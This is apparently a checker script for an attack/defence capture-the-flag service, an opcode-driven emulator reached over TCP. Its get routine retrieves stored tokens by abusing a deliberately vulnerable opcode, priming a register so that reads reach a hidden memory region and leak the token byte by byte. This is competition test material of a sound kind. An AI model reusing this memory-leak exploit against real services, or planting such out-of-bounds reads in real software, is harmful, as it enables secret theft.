#!/usr/bin/env python3
import socket
import sys
import os

PORT = int(os.environ.get("PORT", "5000"))

TOKEN_LEN = 32

def recv_until(sock, marker=b"--END--\n", limit=1_000_000):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > limit:
            raise RuntimeError("response too large")
    return data

def send_opcode(sock, opcode_u16, payload=b""):
    sock.sendall(opcode_u16.to_bytes(2, "big") + payload)
    return recv_until(sock)


def leak_token_byte(sock, offset: int) -> int:
    # Set V0 = offset via opcode 0x60kk then call 0xF0DD (vulnerable)
    set_op = 0x6000 | (offset & 0xFF)
    resp = send_opcode(sock, set_op)
    must_ok(resp)
    sock.sendall((0xF0DD).to_bytes(2, "big"))
    leaked = sock.recv(1)
    if not leaked:
        raise RuntimeError("no leak byte")
    return leaked[0]

def must_ok(resp: bytes):
    if not resp.startswith(b"OK "):
        raise RuntimeError(resp.decode(errors="replace"))

def extract_frame(resp: bytes) -> str:
    text = resp.decode(errors="replace")
    if "\n" not in text:
        return ""
    _, tail = text.split("\n", 1)
    return tail.split("--END--", 1)[0]

def frame_to_lines(frame: str):
    clean = frame.replace("\x1b[2J\x1b[H", "")
    return clean.splitlines()

def assert_pixel(lines, x, y):
    try:
        row = lines[y]
        if len(row) <= x or row[x] != '#':
            raise RuntimeError("pixel missing")
    except IndexError as e:
        raise RuntimeError("frame too small") from e

def draw_text_demo(sock):
    # Clear before drawing
    must_ok(send_opcode(sock, 0x00E0))

    # Draw 'A' at (2,2)
    must_ok(send_opcode(sock, 0x6002))
    must_ok(send_opcode(sock, 0x6102))
    must_ok(send_opcode(sock, 0xA082))
    resp = send_opcode(sock, 0xD015)
    must_ok(resp)
    lines = frame_to_lines(extract_frame(resp))
    assert_pixel(lines, 2, 2)
    assert_pixel(lines, 3, 2)

    # Draw 'B' nearby at (8,2)
    must_ok(send_opcode(sock, 0x6008))
    must_ok(send_opcode(sock, 0xA087))
    resp = send_opcode(sock, 0xD015)
    must_ok(resp)
    lines = frame_to_lines(extract_frame(resp))
    assert_pixel(lines, 8, 2)
    assert_pixel(lines, 9, 2)

def check(host):
    s = socket.create_connection((host, PORT), timeout=5)
    _ = recv_until(s)  # hello
    # Clear screen (00E0)
    resp = send_opcode(s, 0x00E0)
    must_ok(resp)
    # Request a frame
    resp = send_opcode(s, 0xF0FF)
    must_ok(resp)
    # Basic sanity: should contain '.' or '#'
    if b"." not in resp and b"#" not in resp:
        raise RuntimeError("no frame pixels")

    # Draw a couple of glyphs using built-in font sprites to ensure rendering works
    draw_text_demo(s)
    s.close()
    return True

def put(host, token_id, token):
    # token_id: 1..64 chars [A-Za-z0-9_-]
    # token: 32 bytes "[A-Z0-9]{31}="
    if not (len(token) == 32 and token[-1] == "="):
        raise RuntimeError("token format wrong")
    s = socket.create_connection((host, PORT), timeout=5)
    _ = recv_until(s)  # hello

    fid_b = token_id.encode()
    if len(fid_b) == 0 or len(fid_b) > 64:
        raise RuntimeError("bad token_id length")

    payload = bytes([len(fid_b)]) + fid_b + token.encode()
    resp = send_opcode(s, 0xFCCC, payload=payload)
    must_ok(resp)
    s.close()
    return True

def get(host, token_id, expected_token):
    s = socket.create_connection((host, PORT), timeout=5)
    _ = recv_until(s)  # hello
    # Prime I register to 0x200 so NOTE_BASE + I reaches the hidden region (0xE00)
    resp = send_opcode(s, 0xA200)
    must_ok(resp)

    leaked = bytearray()
    for i in range(TOKEN_LEN):
        leaked.append(leak_token_byte(s, i))

    s.close()

    if leaked.decode(errors="replace") != expected_token:
        raise RuntimeError("token mismatch via leak")

    return True

def main():
    # Simple A/D-style interface:
    #   checker.py check HOST
    #   checker.py put HOST TOKEN_ID TOKEN
    #   checker.py get HOST TOKEN_ID TOKEN
    if len(sys.argv) < 3:
        print("usage:\n  checker.py check HOST\n  checker.py put HOST TOKEN_ID TOKEN\n  checker.py get HOST TOKEN_ID TOKEN")
        return 2

    cmd = sys.argv[1]
    host = sys.argv[2]

    try:
        if cmd == "check":
            check(host)
        elif cmd == "put":
            put(host, sys.argv[3], sys.argv[4])
        elif cmd == "get":
            get(host, sys.argv[3], sys.argv[4])
        else:
            raise RuntimeError("unknown cmd")
        return 0
    except Exception as e:
        print(f"ERROR: {e}")
        return 1

if __name__ == "__main__":
    raise SystemExit(main())
